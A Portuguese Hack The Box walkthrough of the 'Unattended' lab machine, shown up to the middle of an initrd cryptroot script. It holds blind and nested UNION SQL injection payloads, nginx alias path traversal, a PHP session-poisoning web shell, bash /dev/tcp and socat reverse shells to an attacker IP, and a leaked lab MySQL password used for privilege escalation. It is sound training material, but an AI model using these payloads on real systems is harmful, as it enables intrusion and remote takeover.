---
title: "Hack The Box - Unattended"
tags: [Linux,Medium,SQLInjection,Blind SQLInjection,Burpsuite,Poison,Web]
categories: HackTheBox OSWE
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-unattended/U_inicial.png)

Link: <https://www.hackthebox.eu/home/machines/profile/184>

# Enumeração

## Primeiro passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-unattended/U_nmap.png)

Humm... algumas coisas nos chamaram atenção assim que rodamos o nmap, uma delas é o `ngix`, outra são os dois vhosts que apareceram ai `www.nestedflanders.htb` e `nestedflanders.htb`

Então vamos adicionar eles ao nosso `/etc/hosts`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-unattended/U_hosts.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

### Verificamos que temos 2 portas abertas no servidor

> Portas 80 e 443 - Servidores Web

## Enumeração de VHOSTS

Bom, encontramos um VHOST, mas é interessante rodarmos um `wfuzz` pra ver se conseguimos mais algum

`wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.nestedflanders.htb" --hh 2 10.10.10.126`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-unattended/U_wfuzz.png)

É, apenas o www, vamos prosseguir então

## Enumeração da porta 80

Abrimos o browser no endereço e encontramos a seguinte página web

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-unattended/U_web.png)

Acessamos também o nestedflanders.htb, uma vez que o dominio www.nestedflanders está forçando SSL

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-unattended/U_web1.png)

Bom, nada de útil. Poderia rodar um gobuster ou wfuzz aqui, mas não iriamos encontrar nada, o ponto de entrada não é por aqui

## Enumeração da porta 443

Abrimos o browser no endereço e encontramos a seguinte página web

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-unattended/U_web2.png)

Abrindo o `www.nestedflanders.htb` encontramos a página inicial do apache2

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-unattended/U_web3.png)

Aqui sim vale a pena rodar um gobuster

### Gobuster www.nestedflanders.htb

Então rodamos o gobuster

> gobuster dir -u https://www.nestedflanders.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php -k

Demora um bocado pra rodar esse comando... não deixei ele rodar por completo pq sei que são apenas dois resultados

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-unattended/U_gobuster.png)

Achamos duas coisas interessantes que nos serão úteis... o `/dev` e o `index.php`

#### /dev

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-unattended/U_web4.png)

#### index.php - Identificando SQLInjection

Então vamos entrar pra ver do que se trata

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-unattended/U_web5.png)

Esse index.php no interessou, pq analisando ele, possivelmente vai estar vulnverável a SQLInjection, uma vez que são passados parâmetros pra ele. Por exemplo, essa é a saída do `About`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-unattended/U_web6.png)

# Blind SQLInjection

A página main tem como id 25, about é 465, e contact é 587.

Vamos sempre testar SQLInjection colocando um `'` no final da requisição, só que neste caso a página web processou ela direitinho, sem problemas, a main que é 25, manteve main

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-unattended/U_web7.png)

Se testarmos isso na 465 é o about, estranhamente ele retorna para o main

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-unattended/U_web8.png)

Podemos testar aqui a prova de conceito do SQLI Blind, se no caso eu colocar `id=587' and 1=1-- -`, o que deve acontecer é manter na página contact, pq 1=1 é sempre verdade. Se eu colocar `id=587' and 1=2-- -` irá para o main.

Podemos testar outras coisas a mais aqui, se eu quiser checar qual a versão do banco de dados que está sendo executado, eu posso fazer um brute force, substituindo o 1=1 por `substring(@@version,1,1)=a para checar e a primeira letra é a

A ideia é essa, na teoria isso deveria acontecer.

O `0xdf` sem seu blog postou um script para enumerar o banco de dados, achei interessante por aprendizado tentar reproduzir ele aqui

A ideia inicial dele é tentar fazer um bruteforce pra descobrir a database... então ele inicia testando pra ver como começa o banco de dados

`if(curl -k -s "https://www.nestedflanders.htb/index.php?id=587'+and+substring(@@version,1,1)='a'--+-" | grep -q 2001); then echo false; else echo true; fi`

Irá fazer uma requisição curl para o local vulnerável e tentará verifica se a database inicia com 'a', se aparecer 2001 na requisição (esse valor aparece quando não é retornado corretamente) ele vai printar false, senão, true

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-unattended/U_sql.png)

`if(curl -k -s "https://www.nestedflanders.htb/index.php?id=587'+and+substring(@@version,1,1)='1'--+-" | grep -q 2001); then echo false; else echo true; fi`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-unattended/U_sql1.png)

Opa! Começa por 1, e assim vai indo...

## SQLMap

Vamos utilizar o sqlmap para fazer o dump desses dados. Primeiro verificamos que realmente é vulnerável

`sqlmap -u https://www.nestedflanders.htb/index.php?id=587 -p id --batch`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-unattended/U_sqlmap.png)

Agora fazemos um dump... o `--threads 10` é pra ir mais rápido, o `--level=5` e o `--risk=2` é pra ir mais fundo no dump

`sqlmap -u https://www.nestedflanders.htb/index.php?id=587 -p id --batch --dump --threads 10 --level=5 --risk=2`

Demora um bocado.... pq a base de dados é grande pra caramba. Depois de `muito` tempo, temos a database `neddy`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-unattended/U_sqlmap1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-unattended/U_sqlmap2.png)

Bom, aqui poderíamos ficar dias e dias pegando informações... contudo o ponto de entrada não é por aqui, por isso a dificuldade dessa máquina

# Explorando dev (nginx)

O caminho /dev pelo que aparece no site diz que foi movido para outro local. Bom, fizemos antes o fuzzing de vhosts e não encontramos nada... quando fiz essa máquina realmente empaquei aqui, tive que procurar ajuda... A ideia aqui é perceber que o /dev está hospedado no mesmo host mas em subdomínio diferente! Isso é possível através do `nginx`, só que atrás disso temos algumas vulnerabilidades

Temos por exemplo esse blog que explica um pouco sobre isso

> https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-unattended/U_ng.png)

A ideia é fazer um Path Traversal, através do nginx... Um vídeo que demonstra isso muito bem é esse (https://www.youtube.com/watch?v=CIhHpkybYsY&feature=youtu.be&t=572)

A explicação dele se resume em:

```
Reposta - Path
200 http://target/assets/app.js
403 http://target/assets/
404 http://target/assets/../settings.py
403 http://target/assets../
200 http://target/assets../
200 http://target/assets../settings.py
```

O que podemos identificar aqui? De cara que colocamos o .. sem o / depois de assets, e ele deu como 200 OK o arquivo settings.py

## Testando na máquina

Podemos fazer o teste nesse diretório /dev

Vamos fazer pelo BurpSuite pq fica mais visual (também poderia ter usado o curl, mas pessoalmente prefiro o BurpSuite)

Não possuimos igual esta no vídeos, mas é parecido

Mandamos uma requisição para o site para o BurpSuite

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-unattended/U_ng1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-unattended/U_ng2.png)

Mandamos para o `Repeater`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-unattended/U_ng3.png)

Testamos o `index.php` e o `/dev`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-unattended/U_ng4.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-unattended/U_ng5.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-unattended/U_ng6.png)

Ambos recebemos o 200 OK

# Identificando vulnerabilidade

Agora se tentarmos subir um diretório no dev, assim como foi feito no exemplo do vídeos, algo estranho nos acontece

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-unattended/U_ng7.png)

403 Forbidden... interessante

Vamos tentar pegar o index.php, acredidando que a estrutura do site é essa, que digamos que é a padrão de um servidor apache2

```
/
  var
    www
      html
      dev
```

GET /dev/../html/index.php HTTP/1.1

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-unattended/U_ng8.png)

GET /dev../html/index.php HTTP/1.1

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-unattended/U_ng9.png)

Oxe, pq eu consigo pegar o código fonte? Quando falamos de nginx, você tem que configurar cada servidor para rodar requisições através de um interpretador PHP. Se o dev não está configurado para rodar php, ele vai jogar o endereço estático, sem interpretar isso, como está acontecendo aqui!

## Analisando index.php

Bom, agora de posse do index.php vamos analisar ele, pra ver se conseguimos fazer alguma coisa

index.php
``` 
<?php
$servername = "localhost";
$username = "nestedflanders";
$password = "1036913cf7d38d4ea4f79b050f171e9fbf3f5e";
$db = "neddy";
$conn = new mysqli($servername, $username, $password, $db);
$debug = False;

include "6fb17817efb4131ae4ae1acae0f7fd48.php";

function getTplFromID($conn) {
	global $debug;
	$valid_ids = array (25,465,587);
	if ( (array_key_exists('id', $_GET)) && (intval($_GET['id']) == $_GET['id']) && (in_array(intval($_GET['id']),$valid_ids)) ) {
			$sql = "SELECT name FROM idname where id = '".$_GET['id']."'";
	} else {
		$sql = "SELECT name FROM idname where id = '25'";
	}
	if ($debug) { echo "sqltpl: $sql<br>\n"; } 
	
	$result = $conn->query($sql);
	if ($result->num_rows > 0) {
	while($row = $result->fetch_assoc()) {
		$ret = $row['name'];
	}
	} else {
		$ret = 'main';
	}
	if ($debug) { echo "rettpl: $ret<br>\n"; }
	return $ret;
}

function getPathFromTpl($conn,$tpl) {
	global $debug;
	$sql = "SELECT path from filepath where name = '".$tpl."'";
	if ($debug) { echo "sqlpath: $sql<br>\n"; }
	$result = $conn->query($sql);
	if ($result->num_rows > 0) {
		while($row = $result->fetch_assoc()) {
			$ret = $row['path'];
		}
	}
	if ($debug) { echo "retpath: $ret<br>\n"; }
	return $ret;
}

$tpl = getTplFromID($conn);
$inc = getPathFromTpl($conn,$tpl);
?>

<!DOCTYPE html>
<html lang="en">
<head>
  <title>Ne(ste)d Flanders</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="bootstrap.min.css">
  <script src="jquery.min.js"></script>
  <script src="bootstrap.min.js"></script>
</head>
<body>

<div class="container">
  <h1>Ne(ste)d Flanders' Portfolio</h1>
</div>

<div class="container">
<div center class="row">
<?php

$sql = "SELECT i.id,i.name from idname as i inner join filepath on i.name = filepath.name where disabled = '0' order by i.id";
if ($debug) { echo "sql: $sql<br>\n"; }

$result = $conn->query($sql);
if ($result->num_rows > 0) {
	while($row = $result->fetch_assoc()) {
		//if ($debug) { echo "rowid: ".$row['id']."<br>\n"; } // breaks layout
		echo '<div class="col-md-2"><a href="index.php?id='.$row['id'].'" target="maifreim">'.$row['name'].'</a></div>';
		}
} else {
?>
	<div class="col-md-2"><a href="index.php?id=25">main</a></div>
	<div class="col-md-2"><a href="index.php?id=465">about</a></div>
	<div class="col-md-2"><a href="index.php?id=587">contact</a></div>
	<?php
}

?>
</div> <!-- row -->
</div> <!-- container -->


<div class="container">
<div class="row">
<!-- <div align="center"> -->
<?php
include("$inc");
?>
<!-- </div> -->

</div> <!-- row -->
</div> <!-- container -->
<?php if ($debug) { echo "include $inc;<br>\n"; } ?>

</body>
</html>

<?php
$conn->close();
?>
```

Uma das coisas que me chamou atenção, foi o fato de ter uma query no meio do código, que não ta muito bem claro o que ela faz...

```
<?php
include("$inc");
?>
```

Onde está inc? O que está sendo incluido?

```
function getTplFromID($conn) {
        global $debug;
        $valid_ids = array (25,465,587);
        if ( (array_key_exists('id', $_GET)) && (intval($_GET['id']) == $_GET['id']) && (in_array(intval($_GET['id']),$valid_ids)) ) {
                        $sql = "SELECT name FROM idname where id = '".$_GET['id']."'";
        } else {
                $sql = "SELECT name FROM idname where id = '25'";
        }
        if ($debug) { echo "sqltpl: $sql<br>\n"; }

        $result = $conn->query($sql);
        if ($result->num_rows > 0) {
        while($row = $result->fetch_assoc()) {
                $ret = $row['name'];
        }
        } else {
                $ret = 'main';
        }
        if ($debug) { echo "rettpl: $ret<br>\n"; }
        return $ret;
}

function getPathFromTpl($conn,$tpl) {
        global $debug;
        $sql = "SELECT path from filepath where name = '".$tpl."'";
        if ($debug) { echo "sqlpath: $sql<br>\n"; }
        $result = $conn->query($sql);
        if ($result->num_rows > 0) {
                while($row = $result->fetch_assoc()) {
                        $ret = $row['path'];
                }
        }
        if ($debug) { echo "retpath: $ret<br>\n"; }
        return $ret;
}

$tpl = getTplFromID($conn);
$inc = getPathFromTpl($conn,$tpl);
?>
```

Aqui está... a primeira função pega um $id da requisição GET (isso eu posso controlar), e guarda ela como $tpl. A segunda função pega esse $tpl e retorna o caminho para incluir o arquivo, que será guardado como $inc.


Bom eu posso controlar esse valor de ID, e dependendo do que eu coloque ali, se for verdadeiro, na teoria ele vai processar o resto da requisição, sendo assim posso colcoar outros valores...

No começo do código verificamos como é feito o check

```
function getTplFromID($conn) {
        global $debug;
        $valid_ids = array (25,465,587);
        if ( (array_key_exists('id', $_GET)) && (intval($_GET['id']) == $_GET['id']) && (in_array(intval($_GET['id']),$valid_ids)) ) {
                        $sql = "SELECT name FROM idname where id = '".$_GET['id']."'";
        }
```

Ele vai passar o check se três condições forem satisfeitas.

1 - array_key_exists('id', $_GET) -- essa não temos muito o que falar, o parâmetro precisa estar lá

2 - intval($_GET['id']) == $_GET['id'] -- essa é um pouco mais complicada

Essa função `intval` vai tentar processar qualquer coisa que começe com INT, o que é usado é isso e o resto é dropado. Vamos passar pra um shell php pra restar isso (php -a)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-unattended/U_pgp.png)

Agora vamos fazer o PHP comparar toda a string com 25. Está é a diferença entre usa == e ===, vai ser mostrado que "25" == "25 o resto é resto" é true.

(https://stackoverflow.com/questions/80646/how-do-the-php-equality-double-equals-and-identity-triple-equals-comp)

`if (25 == "25 e o resto é resto") { echo "true"; } else { echo "false";};`

e

`if (25 === "25 e o resto é resto") { echo "true"; } else { echo "false";};`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-unattended/U_ng10.png)

O que podemos concluir com essas duas afirmações? Se minha query começar com qualquer número, ela vai ser processada! E por último temos o 3º check

3 - in_array(intval($_GET['id']),$valid_ids) -- Só precisar ser um ID válido!

## Controlando $tpl

Agora devemos controlar esse valor da variável $tpl, uma vez controlando ela, podemos controlar toda a query

A primeira query que é feita é essa: `SELECT name FROM idname where id = $_GET['id']`

Vamos ver o que temos nesse TABLE idname na DB neddy

`sqlmap -u https://www.nestedflanders.htb/index.php?id=587 --level=5 --risk=2 --batch -D neddy -T idname --dump --threads 10`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-unattended/U_sqlmap3.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-unattended/U_sqlmap4.png)

Bom, pelo que vimos vai retornar uma string, e como esperado três valores, main, about e contact. Para certificar se podemos ou não controlar essa função, vou começar o meu id com 587, e ver se consigo carregar a página about que tem id 465. A query vai ser essa: 

`SELECT name FROM idname where id = 587 and 1=2 UNION select "about"`

Vou mandar isso no ponto vulnerável

`587' and 1=2 UNION select 'about'-- -`

Funcionou, temos a página "about"

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-unattended/U_ng11.png)

Bom, vamos continuar então

## Controlando $inc

Uma vez controlado o $tpl, próximo passo agora é verificar como podemos controlar o $inc

Do index.php temos

`SELECT path from filepath where name = $tpl`

Então devemos descobrir quais valores estão nesse `filepath` que é uma TABLE da DB neddy

`sqlmap -u https://www.nestedflanders.htb/index.php?id=587 --level=5 --risk=2 --batch -D neddy -T filepath --dump --threads 10`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-unattended/U_sqlmap5.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-unattended/U_sqlmap6.png)

Pelo visto a TABLE é feita de strings, que vão ser incluídas... então para ter controle total dela, a query vai ser assim:

`587' and 1=2 UNION select '1' union select '/etc/passwd'-- -'-- -`

"Protegendo" os ', temos -> `587' and 1=2 UNION select '1\' union select \'/etc/passwd\'-- -'-- -`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-unattended/U_ng12.png)

Verificando por esse lado essa query também irá funcionar

`587' union select "1' union select '/etc/passwd'-- -"-- -`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-unattended/U_ng13.png)

E sim! Funciona... pq será? Vamos lá, o ID é válido, primeiro e segundo check passou, e ele está fazendo um include em outro arquivo depois, pelo union select, então teoricamente a requisição ta parecida com uma real

Temos LFI! Mas não temos como conseguir shell com isso, então vamos mudar nossa abordagem

## Pegando shell (Log poison)

Vamos mandar a requisição pro BurpSuite (Pq fica melhor de visualizar e trabalhar)

Bom, não tenho como conseguir shell direto com o LFI, infelizmente. Mas consigo fazer um `log poisoning`. Vou escrever um simple php shell em um cookie, e ele vai poisonar (nem sei se essa palavra existe) a php session data, e vou ler a saída em /var/lib/php/sessions. Vai ser salvo com o meu cookie, no caso vai ser /var/lib/php/sessions/sess_ju4t3m307i7ua3bof9cfcgdoq1 (valor do meu PHPSSESID)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-unattended/U_ng14.png)

Agora vamos adicionar (ai que vem o poisoning) no PHPSSESID nosso php shell... e nos parâmetros lá em cima passamos nosso comando

`INJECTION=<?php system($_GET['cmd']) ?>`

Ficará assim

GET /index.php?`cmd=id`&id=587'+union+select+"1'+union+select+'/var/lib/php/sessions/sess_ju4t3m307i7ua3bof9cfcgdoq1'--+-"--+- 

Cookie: PHPSESSID=ju4t3m307i7ua3bof9cfcgdoq1; `INJECTION=<?php system($_GET['cmd']) ?>`

Verificando na requisição, temos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-unattended/U_ng15.png)

Caceta! Temos RCE!

Bom, vamos lá... eu tentei fazer um shell em portas altas, e não deram certo, fiquei interessado em saber pq não deu, então vamos verificar as regras de firewall iptables que está habilitado

`GET /index.php?cmd=cat+/etc/iptables/rules.v4&id=587'+union+select+"1'+union+select+'/var/lib/php/sessions/sess_ju4t3m307i7ua3bof9cfcgdoq1'--+-"--+- HTTP/1.1`

e

`Cookie: PHPSESSID=ju4t3m307i7ua3bof9cfcgdoq1; INJECTION=<?php system($_GET['cmd']) ?>`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-unattended/U_ng16.png)

Verificando as regras... temos `-A INPUT -i ens33 -p tcp -m multiport --dports 80,443 -j ACCEPT`

Ou seja, só vai aceitar requisições nas portas 80 e 443, interessante... Então montamos nosso reverse shell pra ser enviado, e pegamos uma reverse shell

`bash -c 'bash -i >& /dev/tcp/10.10.14.40/443 0>&1'`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-unattended/U_ng17.png)

Infelizmente não temos python na máquina, para poder fazer o upgrade pra um shell interativo, mas temos `socat`

`socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.40:443`

Pronto, agora com um shell interativo

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-unattended/U_ng18.png)

# Escalação de Privilégio (www-data -> Guly)

Essa escalação eu digo que não foi tão simples de se conseguir/entender o que estava acontecendo, realmente fora da caixa pra mim, mas vamos lá

Não sei se você se lembra mas conseguimos antes uma conta e senha do mysql dessa máquina, então, vamos nos conectar nela

`mysql -u nestedflanders -p1036913cf7d38d4ea4f79b050f171e9fbf3f5e`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-unattended/U_ng19.png)

Entramos na database `neddy`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-unattended/U_ng20.png)

Checamos a TABLE `config`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-unattended/U_ng21.png)

Esse campo 86 nos chamou atenção

`/home/guly/checkbase.pl;/home/guly/checkplugins.pl;`

Infelizmente não consigo ver oq tem nele, mas possivelmente deve executar algum tipo de comando... então vamos alterar ele para nos dar um reverse shell, vou utilizar o `socat` pra praticar ele. A query ficar assim

`update config set option_value = "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.40:443" where id = 86;`

Verificamos também se o valor foi alterado

`select * from config where id = 86;`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-unattended/U_ng22.png)

E recebemos um shell segundos depois

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-unattended/U_ng23.png)

Show, agora somos `guly`

# Escalação de Privilégio (guly - root)

Bom, agora vamos fazer a escalação de privilégio do usuário `guly` para o `root`. Outra parte da máquina extremamente difícil para mim

Primeira coisa a se notar são os groups que o guly faz parte... Ele faz parte do `grub` e esse grupo não é comum

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-unattended/U_priv.png)

Verificamos todos os arquivos que esse group, ou pelo menos que eu posso ver

`find / -group grub 2>/dev/null`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-unattended/U_priv1.png)

Apenas um... Vamos lá, tentar explicar do que se trata. Quando o sistema linux inicia, ele primeiro monta um RAM disk (initdr) como parte do procedimento de boot do kernel. Esse "disco" tem a minima quantidade de executáveis e estrutura de diretórios para carregados pra se fazer possível e disponível a leitura do file system do root

Vamos passar esse arquivo para nossa máquina para melhor analizar ele, demora um pouquinho pelo tamanho do arquivo...

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-unattended/U_priv2.png)

Agora com o `zcat` eu faço a descompressão total dele

`zcat initrd.img-4.9.0-8-amd64 > arquivo`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-unattended/U_priv3.png)

Criou um arquivo `cpio`, com o cpio eu extraio todo ele, dentro de uma pasta

`zcat initrd.img-4.9.0-8-amd64 | cpio -idm`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-unattended/U_priv4.png)

Dando uma olhada em todos os arquivos, procuramos por aqueles que são executados quando é feito o boot da máquina, e encontramos um que nos interessou `scripts/local-top/cryptroot`

Outro modo de termos encontrado esse arquivo é a partir da data de modificação da máquina

`find . -type f -newermt 2018-12-19 ! -newermt 2018-12-21 -ls`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-unattended/U_a.png)

Pô mas como você sabia dessas datas? A partir da data de criação/modificação da flag de user (20 Dez 2018)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-unattended/U_a1.png)

Bom, mas vamos prosseguir

cryptoroot
```
#!/bin/sh

PREREQ="cryptroot-prepare"

#
# Standard initramfs preamble
#
prereqs()
{
	# Make sure that cryptroot is run last in local-top
	for req in $(dirname $0)/*; do
		script=${req##*/}
		if [ $script != cryptroot ]; then
			echo $script
		fi
	done
}

case $1 in
prereqs)
	prereqs
	exit 0
	;;
esac

# source for log_*_msg() functions, see LP: #272301
. /scripts/functions

#
# Helper functions
#
message()
{
	if [ -x /bin/plymouth ] && plymouth --ping; then
		plymouth message --text="$@"
	else
		echo "$@" >&2
	fi
	return 0
}

udev_settle()
{
	# Wait for udev to be ready, see https://launchpad.net/bugs/85640
	if command -v udevadm >/dev/null 2>&1; then
		udevadm settle --timeout=30
	elif command -v udevsettle >/dev/null 2>&1; then
		udevsettle --timeout=30
	fi
	return 0
}

parse_options()
{
	local cryptopts
	cryptopts="$1"

	if [ -z "$cryptopts" ]; then
		return 1
	fi

	# Defaults
	cryptcipher=aes-cbc-essiv:sha256
	cryptsize=256
	crypthash=ripemd160
	crypttarget=cryptroot
	cryptsource=""
	cryptheader=""
	cryptlvm=""
	cryptkeyscript=""
	cryptkey="" # This is only used as an argument to an eventual keyscript
	crypttries=3
	crypttcrypt=""
	cryptrootdev=""
	cryptdiscard=""
	CRYPTTAB_OPTIONS=""

	local IFS=" ,"
	for x in $cryptopts; do
		case $x in
		hash=*)
			crypthash=${x#hash=}
			;;
		size=*)
			cryptsize=${x#size=}
			;;
		cipher=*)
			cryptcipher=${x#cipher=}
			;;
		target=*)
			crypttarget=${x#target=}
			export CRYPTTAB_NAME="$crypttarget"
			;;
		source=*)
			cryptsource=${x#source=}
			if [ ${cryptsource#UUID=} != $cryptsource ]; then
				cryptsource="/dev/disk/by-uuid/${cryptsource#UUID=}"
			elif [ ${cryptsource#LABEL=} != $cryptsource ]; then
				cryptsource="/dev/disk/by-label/${cryptsource#LABEL=}"
			fi
			export CRYPTTAB_SOURCE="$cryptsource"
			;;
		header=*)
			cryptheader=${x#header=}
			if [ ! -e "$cryptheader" ] && [ -e "/conf/conf.d/cryptheader/$cryptheader" ]; then
				cryptheader="/conf/conf.d/cryptheader/$cryptheader"
			fi
			export CRYPTTAB_HEADER="$cryptheader"
			;;
		lvm=*)
			cryptlvm=${x#lvm=}
			;;
		keyscript=*)
			cryptkeyscript=${x#keyscript=}
			;;
		key=*)
			if [ "${x#key=}" != "none" ]; then
				cryptkey=${x#key=}
			fi
			export CRYPTTAB_KEY="$cryptkey"
			;;
		tries=*)
			crypttries="${x#tries=}"
			case "$crypttries" in
			  *[![:digit:].]*)
				crypttries=3
				;;
			esac
			;;
		tcrypt)
			crypttcrypt="yes"
			;;
		rootdev)
			cryptrootdev="yes"
			;;
		discard)
			cryptdiscard="yes"
			;;
		esac
		PARAM="${x%=*}"
		if [ "$PARAM" = "$x" ]; then
			VALUE="yes"
		else
			VALUE="${x#*=}"
		fi
		CRYPTTAB_OPTIONS="$CRYPTTAB_OPTIONS $PARAM"
		eval export CRYPTTAB_OPTION_$PARAM="\"$VALUE\""
	done
	export CRYPTTAB_OPTIONS

	if [ -z "$cryptsource" ]; then
		message "cryptsetup: source parameter missing"
		return 1
	fi
	return 0
}

activate_vg()
{
	# Sanity checks
	if [ ! -x /sbin/lvm ]; then
		message "cryptsetup: lvm is not available"
		return 1
	fi

	# Detect and activate available volume groups
	/sbin/lvm vgscan
	/sbin/lvm vgchange -a y --sysinit
	return $?
}

setup_mapping()
{
	local opts count cryptopen cryptremove NEWROOT
	opts="$1"

	if [ -z "$opts" ]; then
		return 0
	fi

	parse_options "$opts" || return 1

	if [ -n "$cryptkeyscript" ] && ! type "$cryptkeyscript" >/dev/null; then
		message "cryptsetup: error - script \"$cryptkeyscript\" missing"
		return 1
	fi

	if [ -n "$cryptheader" ] && ! type "$cryptheader" >/dev/null; then
		message "cryptsetup: error - LUKS header \"$cryptheader\" missing"
		return 1
	fi

	# The same target can be specified multiple times
	# e.g. root and resume lvs-on-lvm-on-crypto
	if [ -e "/dev/mapper/$crypttarget" ]; then
		return 0
	fi

	modprobe -q dm_crypt

	# Make sure the cryptsource device is available
	if [ ! -e $cryptsource ]; then
		activate_vg
	fi

	# If the encrypted source device hasn't shown up yet, give it a
	# little while to deal with removable devices

	# the following lines below have been taken from
	# /usr/share/initramfs-tools/scripts/local, as suggested per
	# https://launchpad.net/bugs/164044
	if [ ! -e "$cryptsource" ]; then
		log_begin_msg "Waiting for encrypted source device..."

		# Default delay is 180s
		if [ -z "${ROOTDELAY}" ]; then
			slumber=180
		else
			slumber=${ROOTDELAY}
		fi

		slumber=$(( ${slumber} * 10 ))
		while [ ! -e "$cryptsource" ]; do
			# retry for LVM devices every 10 seconds
			if [ ${slumber} -eq $(( ${slumber}/100*100 )) ]; then
				activate_vg
			fi

			/bin/sleep 0.1
			slumber=$(( ${slumber} - 1 ))
			[ ${slumber} -gt 0 ] || break
		done

		if [ ${slumber} -gt 0 ]; then
			log_end_msg 0
		else
			log_end_msg 1 || true
		fi
 	fi
	udev_settle

	# We've given up, but we'll let the user fix matters if they can
	if [ ! -e "${cryptsource}" ]; then
		
		echo "  ALERT! ${cryptsource} does not exist."
		echo "	Check cryptopts=source= bootarg: cat /proc/cmdline"
		echo "	or missing modules, devices: cat /proc/modules; ls /dev"
		panic -r "Dropping to a shell. Will skip ${cryptsource} if you can't fix."
	fi

	if [ ! -e "${cryptsource}" ]; then
		return 1
	fi


	# Prepare commands
	cryptopen="/sbin/cryptsetup -T 1"
	if [ "$cryptdiscard" = "yes" ]; then
		cryptopen="$cryptopen --allow-discards"
	fi
	if [ -n "$cryptheader" ]; then
		cryptopen="$cryptopen --header=$cryptheader"
	fi
